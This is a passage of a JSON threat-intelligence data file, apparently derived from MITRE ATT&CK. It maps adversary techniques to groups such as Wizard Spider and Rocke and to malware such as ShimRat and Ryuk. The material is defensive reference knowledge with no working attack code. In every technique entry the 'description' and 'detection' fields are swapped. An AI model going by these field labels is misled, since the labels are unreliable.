                "detection": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Unix Shell",
                "chain_phase": "execution",
                "description": "Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. ",
                "detection": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1560.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Archive via Utility",
                "chain_phase": "collection",
                "description": "Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)",
                "detection": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip, WinRAR, and WinZip. Most utilities include functionality to encrypt and/or compress data.\n\nSome 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Invalid Code Signature",
                "chain_phase": "defense-evasion",
                "description": "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.",
                "detection": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.\n\nUnlike Code Signing, this activity will not result in a valid signature.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerading",
                "chain_phase": "defense-evasion",
                "description": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE”.",
                "detection": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0466",
            "type": "tool",
            "attributes": {
                "name": "WindTail",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WindTail is a macOS surveillance implant used by Windshift. WindTail shares code similarities with Hack Back aka KitM OSX.",
                "platforms": [
                    "macOS"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1564.003": "Hidden Window",
                    "T1059.004": "Unix Shell",
                    "T1560.001": "Archive via Utility",
                    "T1036.001": "Invalid Code Signature",
                    "T1070.004": "File Deletion",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1119": "Automated Collection",
                    "T1106": "Native API",
                    "T1083": "File and Directory Discovery",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 14
        },
        {
            "id": "G0108",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Blue Mockingbird",
                "aliases": [],
                "description": "Blue Mockingbird is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1574.012": "COR_PROFILER",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1218.010": "Regsvr32",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1496": "Resource Hijacking",
                    "T1190": "Exploit Public-Facing Application",
                    "T1134": "Access Token Manipulation",
                    "T1112": "Modify Registry",
                    "T1090": "Proxy",
                    "T1082": "System Information Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "G0107",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Whitefly",
                "aliases": [],
                "description": "Whitefly is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore’s largest public health organization, SingHealth.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1204.002": "Malicious File",
                    "T1003.001": "LSASS Memory",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1105": "Ingress Tool Transfer",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1059": "Command and Scripting Interpreter",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "G0106",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Rocke",
                "aliases": [],
                "description": "Rocke is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name Rocke comes from the email address \"rocke@live.cn\" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between Rocke and the Iron Cybercrime Group, though this attribution has not been confirmed.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1027.004": "Compile After Delivery",
                    "T1071.001": "Web Protocols",
                    "T1102.001": "Dead Drop Resolver",
                    "T1571": "Non-Standard Port",
                    "T1574.006": "Dynamic Linker Hijacking",
                    "T1059.006": "Python",
                    "T1059.004": "Unix Shell",
                    "T1564.001": "Hidden Files and Directories",
                    "T1518.001": "Security Software Discovery",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.001": "Disable or Modify Tools",
                    "T1021.004": "SSH",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.002": "Software Packing",
                    "T1222.002": "Linux and Mac File and Directory Permissions Modification",
                    "T1552.004": "Private Keys",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1070.002": "Clear Linux or Mac System Logs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.002": "Systemd Service",
                    "T1055.002": "Portable Executable Injection",
                    "T1053.003": "Cron",
                    "T1496": "Resource Hijacking",
                    "T1190": "Exploit Public-Facing Application",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1082": "System Information Discovery",
                    "T1071": "Application Layer Protocol",
                    "T1057": "Process Discovery",
                    "T1046": "Network Service Scanning",
                    "T1037": "Boot or Logon Initialization Scripts",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1014": "Rootkit"
                }
            }
        },
        {
            "id": "G0105",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "DarkVishnya",
                "aliases": [],
                "description": "DarkVishnya is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0191": "Winexe",
                    "S0029": "PsExec"
                },
                "techniques": {
                    "T1571": "Non-Standard Port",
                    "T1059.001": "PowerShell",
                    "T1543.003": "Windows Service",
                    "T1219": "Remote Access Software",
                    "T1200": "Hardware Additions",
                    "T1135": "Network Share Discovery",
                    "T1110": "Brute Force",
                    "T1046": "Network Service Scanning",
                    "T1040": "Network Sniffing"
                }
            }
        },
        {
            "id": "S0191",
            "type": "tool",
            "attributes": {
                "name": "Winexe",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Winexe is a lightweight, open source tool similar to PsExec designed to allow system administrators to execute commands on remote servers.  Winexe is unique in that it is a GNU/Linux based client.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1569.002": "Service Execution"
                }
            },
            "val": 1
        },
        {
            "id": "G0104",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Sharpshooter",
                "aliases": [],
                "description": "Operation Sharpshooter is the name of a cyber espionage campaign discovered in October 2018 targeting nuclear, defense, energy, and financial companies. Though overlaps between this adversary and Lazarus Group have been noted, definitive links have not been established.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0448": "Rising Sun"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1566.001": "Spearphishing Attachment",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1055": "Process Injection"
                }
            }
        },
        {
            "id": "T1560.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Archive via Custom Method",
                "chain_phase": "collection",
                "description": "Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.",
                "detection": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0448",
            "type": "tool",
            "attributes": {
                "name": "Rising Sun",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Rising Sun is a modular backdoor malware used extensively in Operation Sharpshooter. The malware has been observed targeting nuclear, defense, energy, and financial services companies across the world. Rising Sun uses source code from Lazarus Group's Trojan Duuzer.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1564.001": "Hidden Files and Directories",
                    "T1560.003": "Archive via Custom Method",
                    "T1070.004": "File Deletion",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1106": "Native API",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 15
        },
        {
            "id": "G0103",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Mofang",
                "aliases": [],
                "description": "Mofang is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0445": "ShimRatReporter",
                    "S0444": "ShimRat"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "T1518",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Software Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1087",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Account Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "S0445",
            "type": "tool",
            "attributes": {
                "name": "ShimRatReporter",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "ShimRatReporter is a tool used by suspected Chinese adversary Mofang to automatically conduct initial discovery. The details from this discovery are used to customize follow-on payloads (such as ShimRat) as well as set up faux infrastructure which mimics the adversary's targets. ShimRatReporter has been used in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1560": "Archive Collected Data",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1518": "Software Discovery",
                    "T1119": "Automated Collection",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1087": "Account Discovery",
                    "T1082": "System Information Discovery",
                    "T1069": "Permission Groups Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "T1090.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "External Proxy",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Hijack Execution Flow",
                "chain_phase": "persistence",
                "description": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1546.011",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Application Shimming",
                "chain_phase": "privilege-escalation",
                "description": "There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):\n\n* Shim-Process-Scanner - checks memory of every running process for any shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.",
                "detection": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0444",
            "type": "tool",
            "attributes": {
                "name": "ShimRat",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ShimRat has been used by the suspected China-based adversary Mofang in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development. The name \"ShimRat\" comes from the malware's extensive use of Windows Application Shimming to maintain persistence.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1090.002": "External Proxy",
                    "T1574": "Hijack Execution Flow",
                    "T1059.003": "Windows Command Shell",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1546.011": "Application Shimming",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1008": "Fallback Channels",
                    "T1005": "Data from Local System"
                }
            },
            "val": 21
        },
        {
            "id": "G0102",
            "type": "group",
            "attributes": {
                "val": 13,
                "name": "Wizard Spider",
                "aliases": [
                    "UNC1878",
                    "TEMP.MixMaster",
                    "Grim Spider"
                ],
                "description": "Wizard Spider is a financially motivated criminal group that has been conducting ransomware campaigns since at least August 2018 against a variety of organizations, ranging from major corporations to hospitals.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0552": "AdFind",
                    "S0521": "BloodHound",
                    "S0446": "Ryuk",
                    "S0367": "Emotet",
                    "S0363": "Empire",
                    "S0359": "Nltest",
                    "S0266": "TrickBot",
                    "S0154": "Cobalt Strike",
                    "S0097": "Ping",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0024": "Dyre",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1588.003": "Code Signing Certificates",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1078.002": "Domain Accounts",
                    "T1570": "Lateral Tool Transfer",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1569.002": "Service Execution",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1087.002": "Domain Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1557.001": "LLMNR/NBT-NS Poisoning and SMB Relay",
                    "T1558.003": "Kerberoasting",
                    "T1003.003": "NTDS",
                    "T1003.002": "Security Account Manager",
                    "T1021.006": "Windows Remote Management",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1222.001": "Windows File and Directory Permissions Modification",
                    "T1070.004": "File Deletion",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1489": "Service Stop",
                    "T1210": "Exploitation of Remote Services",
                    "T1135": "Network Share Discovery",
                    "T1133": "External Remote Services",
                    "T1112": "Modify Registry",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1074": "Data Staged",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "S0552",
            "type": "tool",
            "attributes": {
                "name": "AdFind",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "AdFind is a free command-line query tool that can be used for gathering information from Active Directory.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1482": "Domain Trust Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 5
        },
        {
            "id": "T1205",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Traffic Signaling",
                "chain_phase": "defense-evasion",
                "description": "Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\nThe Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN)",
                "detection": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.    To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "S0446",
            "type": "tool",
            "attributes": {
                "name": "Ryuk",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Ryuk is a ransomware designed to target enterprise environments that has been used in attacks since at least 2018. Ryuk shares code similarities with Hermes ransomware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1078.002": "Domain Accounts",
                    "T1059.003": "Windows Command Shell",
                    "T1562.001": "Disable or Modify Tools",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1222.001": "Windows File and Directory Permissions Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1490": "Inhibit System Recovery",
                    "T1489": "Service Stop",
                    "T1486": "Data Encrypted for Impact",
                    "T1205": "Traffic Signaling",
                    "T1134": "Access Token Manipulation",
                    "T1106": "Native API",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
